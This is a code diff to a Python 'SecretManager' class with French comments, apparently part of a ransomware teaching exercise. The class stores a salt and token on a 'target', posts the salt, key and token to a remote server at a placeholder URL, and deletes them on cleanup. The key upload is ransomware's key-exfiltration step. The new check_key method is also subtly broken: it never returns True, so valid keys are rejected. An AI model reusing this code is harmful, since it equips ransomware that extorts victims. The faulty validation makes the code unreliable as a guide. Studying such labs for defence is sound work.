@@ -55,7 +55,7 @@ class SecretManager:
         data = {"token": token_b64, "salt": salt_b64, "key": key_b64}
         json_data = json.dumps(data)
         #on met les données crypto en base 64 pour être sur qu'elles seront bien transmises sans être erronées.
-        response = requests.post("http://example.com/new", json=json_data)
+        response = requests.post("http://url/", json=json_data)
         #on envoie une requête POST à un serveur distant
         if response.status_code != 200:
             raise Exception("Failed to send data to server")
@@ -71,17 +71,31 @@ class SecretManager:
         self.post_new(salt, key, token)
 
     def load(self)->None:
-        # function to load crypto data
-        raise NotImplemented()
+        salt_path = os.path.join(self._path, 'salt.bin')
+        token_path = os.path.join(self._path, 'token.bin')
+        if not os.path.exists(salt_path) or not os.path.exists(token_path):
+            raise FileNotFoundError('Fichier(s) salt.bin et/ou token.bin non trouvé(s)')
+        
+        with open(salt_path, 'rb') as f:
+            self._salt = f.read()
+        
+        with open(token_path, 'rb') as f:
+            self._token = f.read()
 
     def check_key(self, candidate_key:bytes)->bool:
         # Assert the key is valid
-        raise NotImplemented()
+        # On vérifie que la longueur de la clé est correcte
+        if len(candidate_key) != 32:
+            return False
 
     def set_key(self, b64_key:str)->None:
         # If the key is valid, set the self._key var for decrypting
-        raise NotImplemented()
-
+        candidate_key = base64.b64decode(b64_key)
+        if self.check_key(candidate_key):
+            self._key = candidate_key
+        else:
+            raise ValueError("Invalid key")
+        
     def get_hex_token(self)->str:
         # Should return a string composed of hex symbole, regarding the token
         hash_object = sha256(self._token)
@@ -103,4 +117,12 @@ class SecretManager:
 
     def clean(self):
         # remove crypto data from the target
-        raise NotImplemented()
+        # On supprime les fichiers contenant le sel et le jeton
+        salt_path = os.path.join(self._path, "salt.bin")
+        if os.path.exists(salt_path):
+            os.remove(salt_path)
+        token_path = os.path.join(self._path, "token.bin")
+        if os.path.exists(token_path):
+            os.remove(token_path)
+        # On reset la clé
+        self._key = None
